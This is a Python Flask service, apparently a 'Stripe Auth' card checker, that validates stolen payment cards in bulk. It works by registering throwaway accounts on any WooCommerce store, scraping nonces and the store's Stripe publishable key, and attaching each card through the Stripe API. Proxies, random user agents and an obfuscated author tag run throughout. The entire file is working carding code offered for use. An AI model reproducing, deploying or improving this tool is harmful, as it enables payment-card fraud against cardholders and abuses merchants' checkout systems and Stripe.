import sys
import os
import asyncio
import json
import re
import random
import base64
import uuid
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
import aiohttp
from fake_useragent import UserAgent

app = Flask(__name__)
CORS(app)

_0x4f2b = base64.b64decode('QG11bWlydV9icm8=').decode()

def parse_card_data(card_string):
    try:
        card_string = card_string.replace(' ', '')
        if '|' in card_string:
            parts = card_string.split('|')
            if len(parts) >= 4:
                return {
                    'number': parts[0],
                    'exp_month': parts[1],
                    'exp_year': parts[2][-2:] if len(parts[2]) == 4 else parts[2],
                    'cvc': parts[3].strip()
                }
        return None
    except:
        return None

def generate_random_email():
    username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{username}{number}@{random.choice(domains)}"

def generate_guid():
    return str(uuid.uuid4())

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except:
        return None

async def process_stripe_card(base_url, card_data, proxy_url=None):
    ua = UserAgent()
    
    try:
        if not base_url.startswith(('http://', 'https://')):
            base_url = 'https://' + base_url
        
        timeout = aiohttp.ClientTimeout(total=70)
        connector = aiohttp.TCPConnector(ssl=False)
        
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            from urllib.parse import urlparse
            parsed = urlparse(base_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            
            # Register and login logic from original script
            headers = {'user-agent': ua.random}
            resp = await session.get(base_url, headers=headers, proxy=proxy_url)
            resp_text = await resp.text()
            
            register_nonce = (
                gets(resp_text, 'woocommerce-register-nonce" value="', '"') or
                gets(resp_text, 'id="woocommerce-register-nonce" value="', '"')
            )
            
            if register_nonce:
                email = generate_random_email()
                username = email.split('@')[0]
                password = f"Pass{random.randint(100000, 999999)}!"
                
                register_data = {
                    'email': email,
                    'woocommerce-register-nonce': register_nonce,
                    'register': 'Register',
                }
                await session.post(base_url, headers=headers, data=register_data, proxy=proxy_url)
            
            add_payment_url = f"{domain}/my-account/add-payment-method/"
            resp = await session.get(add_payment_url, headers=headers, proxy=proxy_url)
            payment_page_text = await resp.text()
            
            add_card_nonce = (
                gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or
                gets(payment_page_text, 'add_card_nonce":"', '"') or
                gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"')
            )
            
            stripe_key = (
                gets(payment_page_text, '"key":"pk_', '"') or
                gets(payment_page_text, 'data-key="pk_', '"') or
                gets(payment_page_text, 'publishable_key":"pk_', '"')
            )
            
            if not stripe_key:
                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
                if pk_match:
                    stripe_key = pk_match.group(0)
            
            if not stripe_key:
                return False, "Stripe key not found"
            
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua.random
            }
            
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'guid': generate_guid(),
                'muid': generate_guid(),
                'sid': generate_guid(),
                'key': stripe_key,
                '_stripe_version': '2024-06-20',
            }
            
            pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy_url)
            pm_json = await pm_resp.json()
            
            if 'error' in pm_json:
                return False, pm_json['error']['message']
            
            pm_id = pm_json.get('id')
            if not pm_id:
                return False, "Failed to create payment method"
            
            confirm_headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': domain,
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': ua.random
            }
            
            endpoints = [
                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 'data': {'wc-stripe-payment-method': pm_id, '_ajax_nonce': add_card_nonce, 'wc-stripe-payment-type': 'card'}},
                {'url': f"{domain}/?wc-ajax=add_payment_method", 'data': {'wc-stripe-payment-method': pm_id, 'woocommerce-add-payment-method-nonce': add_card_nonce, 'payment_method': 'stripe'}},
            ]
            
            for endp in endpoints:
                if not add_card_nonce:
                    continue
                try:
                    res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers, proxy=proxy_url)
                    text = await res.text()
                    
                    if 'success' in text.lower():
                        return True, f"Approved [By {_0x4f2b}]"
                    elif 'error' in text.lower():
                        return False, f"Declined [By {_0x4f2b}]"
                except:
                    continue
            
            return False, "Could not verify on site"
    
    except Exception as e:
        return False, f"Error: {str(e)}"

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'active', 'author': '@mumiru_bro'})

@app.route('/check/single', methods=['GET', 'POST'])
async def check_single():
    try:
        if request.method == 'GET':
            site = request.args.get('site')
            card = request.args.get('card')
        else:
            data = request.get_json()
            site = data.get('site')
            card = data.get('card')
        
        if not site or not card:
            return jsonify({'error': 'Missing site or card'}), 400
        
        card_data = parse_card_data(card)
        if not card_data:
            return jsonify({'error': 'Invalid format. Use: NUM|MM|YY|CVV'}), 400
        
        approved, msg = await process_stripe_card(site, card_data)
        
        return jsonify({
            'card': card,
            'site': site,
            'approved': approved,
            'message': msg,
            'author': '@mumiru_bro'
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/check/bulk', methods=['POST'])
async def check_bulk():
    try:
        data = request.get_json()
        site = data.get('site')
        cards = data.get('cards', [])
        
        if isinstance(cards, str):
            cards = [c.strip() for c in cards.split('\n') if c.strip()]
        
        results = []
        for card in cards:
            card_data = parse_card_data(card)
            if not card_data:
                results.append({'card': card, 'approved': False, 'message': 'Invalid format'})
                continue
            approved, msg = await process_stripe_card(site, card_data)
            results.append({'card': card, 'approved': approved, 'message': msg})
        
        return jsonify({
            'site': site,
            'total': len(results),
            'approved_count': len([r for r in results if r['approved']]),
            'declined_count': len([r for r in results if not r['approved']]),
            'results': results
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/', methods=['GET'])
def root():
    return jsonify({
        'name': 'Stripe Auth API',
        'author': '@mumiru_bro',
        'endpoints': {
            'GET /health': 'Status check',
            'POST /check/single': '{"site":"url","card":"num|mm|yy|cvv"}',
            'POST /check/bulk': '{"site":"url","cards":["card1","card2"]}'
        }
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("[*] Stripe Auth API Running")
    app.run(host='0.0.0.0', port=port, debug=False)